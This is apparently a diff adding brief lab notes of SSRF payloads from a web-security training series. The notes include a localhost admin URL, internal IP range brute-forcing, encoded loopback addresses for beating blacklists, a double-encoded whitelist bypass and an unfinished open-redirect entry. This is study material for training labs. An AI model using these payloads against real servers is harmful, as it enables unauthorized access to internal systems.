@@ -1,0 +1,33 @@
+-----> Basic SSRF against the local server
+
+http://localhost/admin
+
+
+
+-----> Basic SSRF against another back-end system
+
+192.168.0.X bruteforce ip range
+
+
+
+-----> SSRF with blacklist-based input filter
+
+2130706433, 017700000001, 127.1, or 127.0
+
+
+
+-----> SSRF with whitelist-based input filter
+            
+http://localhost:80%2523@stock.weliketoshop.net/admin
+
+# --> Double Encoding
+
+
+
+-----> SSRF with filter bypass via open redirection vulnerability
+
+&path= 
+
+Encode & symbol 
+
+
